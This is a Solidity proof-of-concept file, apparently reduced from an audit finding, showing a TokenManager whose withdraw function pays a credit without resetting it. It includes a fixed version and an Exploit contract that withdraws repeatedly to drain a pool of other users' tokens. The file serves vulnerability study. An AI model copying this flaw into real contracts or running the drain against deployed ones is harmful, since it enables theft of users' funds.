// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Tadle — TokenManager.withdraw never clears userTokenBalanceMap (Codehawks, inzinko)
    SYNTHETIC, cheatcode-free reduction. The blamed read is verbatim: claimAbleAmount is
    loaded and paid from CapitalPool, and the mapping is not written back. */

contract MockUSDC {
    string public constant symbol = "USDC";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract CapitalPool {
    function approveToken(MockUSDC token, address manager) external {
        token.approve(manager, type(uint256).max);
    }
}

contract TokenManager {
    // user => token => balance type. Type 0 is MakerRefund, the aborted-offer credit.
    mapping(address => mapping(address => mapping(uint8 => uint256))) public userTokenBalanceMap;
    CapitalPool public capitalPool;

    constructor(CapitalPool _pool) {
        capitalPool = _pool;
    }

    // The credit abortAskOffer writes. Not the bug.
    function creditRefund(address account, address token, uint256 amount) external {
        userTokenBalanceMap[account][token][0] += amount;
    }

    function withdraw(address _tokenAddress, uint8 _tokenBalanceType) external {
        uint256 claimAbleAmount = userTokenBalanceMap[msg.sender][_tokenAddress][_tokenBalanceType]; // @> VULN: the credit is read and paid, then never written back to zero. FIX: set this slot to 0 before the transfer.
        if (claimAbleAmount == 0) {
            return;
        }
        MockUSDC(_tokenAddress).transferFrom(address(capitalPool), msg.sender, claimAbleAmount);
    }
}

contract TokenManagerFixed is TokenManager {
    constructor(CapitalPool pool) TokenManager(pool) {}

    function withdrawOnce(address _tokenAddress, uint8 _tokenBalanceType) external {
        uint256 claimAbleAmount = userTokenBalanceMap[msg.sender][_tokenAddress][_tokenBalanceType];
        userTokenBalanceMap[msg.sender][_tokenAddress][_tokenBalanceType] = 0;
        if (claimAbleAmount == 0) return;
        MockUSDC(_tokenAddress).transferFrom(address(capitalPool), msg.sender, claimAbleAmount);
    }
}

contract Exploit {
    MockUSDC public token; // nonce 1
    CapitalPool public pool; // nonce 2
    TokenManager public manager; // nonce 3

    constructor() {
        token = new MockUSDC();
        pool = new CapitalPool();
        manager = new TokenManager(pool);
    }

    function run() external {
        token.mint(address(pool), 1000 ether);
        pool.approveToken(token, address(manager));
        // Aborting an offer credits 100 USDC. The other 900 in the pool belongs to other makers.
        manager.creditRefund(address(this), address(token), 100 ether);
        for (uint256 i = 0; i < 10; i++) {
            manager.withdraw(address(token), 0);
        }
        require(token.balanceOf(address(this)) == 1000 ether, "drained");
        require(token.balanceOf(address(pool)) == 0, "pool empty");
        require(manager.userTokenBalanceMap(address(this), address(token), 0) == 100 ether, "credit remains");
    }
}
